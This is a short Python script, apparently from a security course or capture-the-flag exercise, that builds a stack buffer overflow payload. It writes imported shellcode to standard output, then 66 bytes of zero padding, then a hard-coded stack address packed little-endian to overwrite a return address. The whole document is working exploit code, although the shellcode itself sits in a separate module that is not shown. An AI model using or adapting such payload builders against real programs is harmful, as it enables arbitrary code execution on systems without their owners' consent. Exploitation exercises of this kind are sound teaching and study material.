#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode + b'\x00'*66 + 0x7ffffff69e70.to_bytes(8, 'little'))